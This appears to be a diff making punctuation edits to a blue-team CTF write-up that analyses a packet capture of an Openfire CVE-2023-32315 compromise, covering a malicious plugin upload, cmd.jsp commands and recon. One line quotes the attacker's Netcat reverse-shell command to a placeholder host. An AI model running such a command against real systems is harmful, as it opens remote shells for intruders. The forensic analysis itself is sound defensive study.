@@ -3,7 +3,7 @@
 **Environment:** CyberDefenders (Blue Team CTF)  ·  **Category:** Network Forensics  ·  **Difficulty:** Easy  ·  **Date completed:** [2026-09-08]
 **Tags:** `network-forensics` `pcap` `wireshark` `cve-2023-32315` `openfire` `mitre-attack`
 
-> Educational lab exercise from CyberDefenders. Challenge-specific answer values (tokens, credentials, created usernames, host addresses) are redacted or masked in line with the platform's terms — the focus of this write-up is the PCAP analysis methodology.
+> Educational lab exercise from CyberDefenders. Challenge-specific answer values (tokens, credentials, created usernames, host addresses) are redacted or masked in line with the platform's terms - the focus of this write-up is the PCAP analysis methodology.
 
 ---
 
@@ -34,9 +34,9 @@ This was a pure **network-forensics** exercise: no endpoint logs or memory image
 
 **5. Spot the plugin upload by its shape, not its content.** Staying on the POST filter, a request to `plugin-admin.jsp` stood out purely by size - roughly **2.5 KB** against the few-hundred-byte login requests. That length anomaly was the tell. Following the HTTP stream confirmed a `multipart/form-data` body carrying a malicious **JAR plugin** — the persistence/RCE mechanism.
 
-**6. Trace command execution.** Filtered on `http.request.uri contains "cmd"` to surface requests to the plugin's `cmd.jsp` endpoint (the command interface the malicious plugin exposed). Inspecting the first request's payload showed the attacker's opening move — a `whoami` to check privilege.
+**6. Trace command execution.** Filtered on `http.request.uri contains "cmd"` to surface requests to the plugin's `cmd.jsp` endpoint (the command interface the malicious plugin exposed). Inspecting the first request's payload showed the attacker's opening move - a `whoami` to check privilege.
 
-**7. Recover the reverse shell and follow it.** In the same command traffic, one `cmd.jsp` request carried a **Netcat reverse shell** back to the attacker's host (`nc <attacker-ip> <port> -e /bin/bash`). Switching from the HTTP view to the TCP stream for that session (`ip.src == <attacker-ip> && tcp.port == <port>`) exposed the interactive commands that followed — including network-interface recon (`ifconfig`).
+**7. Recover the reverse shell and follow it.** In the same command traffic, one `cmd.jsp` request carried a **Netcat reverse shell** back to the attacker's host (`nc <attacker-ip> <port> -e /bin/bash`). Switching from the HTTP view to the TCP stream for that session (`ip.src == <attacker-ip> && tcp.port == <port>`) exposed the interactive commands that followed - including network-interface recon (`ifconfig`).
 
 **8. Attribute the root cause.** The exploitation pattern - an unauthenticated path into the admin console followed by a plugin upload leading to RCE - matched **CVE-2023-32315**, the Openfire admin-console path-traversal / authentication-bypass vulnerability. The observed chain (unauthorised access → plugin upload → command execution) aligned with it exactly.
 
